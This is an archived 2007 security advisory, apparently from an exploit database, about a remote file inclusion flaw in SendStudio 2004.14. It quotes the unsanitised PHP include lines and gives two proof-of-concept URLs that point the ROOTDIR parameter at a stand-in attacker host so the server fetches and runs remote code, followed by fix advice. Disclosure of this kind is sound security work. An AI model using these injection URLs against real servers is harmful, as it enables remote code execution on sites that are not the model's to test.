{
  "id": "3348",
  "title": "SendStudio 2004.14 - &#039;ROOTDIR&#039; Remote File Inclusion",
  "cve": "CVE-2007-1060",
  "vuln_type": "unknown",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_66$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_66$2007] SendStudio <= 2004.14 Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : Feb, 20th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv66-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : SendStudio \r\nversion       : <= 2004.14\r\nURL           : http://www.interspire.com/sendstudio/\r\nDescription :\r\n\r\nSendStudio is PHP email marketing software that lets you create, send and track an unlimited number of email messages and autoresponders. Over 25,000 people are already using SendStudio to keep in touch with their subscribers.\r\n\r\nOnce installed on your web server you can say goodbye to clunky, outdated desktop applications (such as Outlook) and email your subscribers using SendStudio whenever you like from where ever you like using your favorite web browser.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n- Invalid include function at admin/includes/createemails.inc.php :\r\n\r\n---------------createemails.inc.php--------------------------------------\r\n<?php\r\nrequire_once($ROOTDIR.'admin/functions/general.php');\r\n\r\n...\r\n------------------------------------------------------------------\r\n\r\n- invalid include function at admin/includes/send_emails.inc.php :\r\n\r\n--------------------send_emails.inc.php--------------------------\r\n<?php\r\n\r\n        global $ROOTDIR;\r\n        include($ROOTDIR . 'admin/includes/createemails.inc.php');\r\n...\r\n\r\n-------------------------------------------------------------------\r\n\r\nVariables $ROOTDIR are not properly sanitized.\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~~\r\n\r\nhttp://www.target.com/sendstudio/admin/includes/createemails.inc.php?ROOTDIR=http://attacker.com/evil?\r\nhttp://www.target.com/sendstudio/admin/includes/send_emails.inc.php?ROOTDIR=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Sanitize variable $ROOTDIR on affected files.\r\n- Turn off register_globals\r\n- use the lates version\r\n\r\nNotification :\r\n~~~~~~~~~~\r\nvendor was contacted\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-02-20]",
  "url": "https://www.exploit-db.com/exploits/3348"
}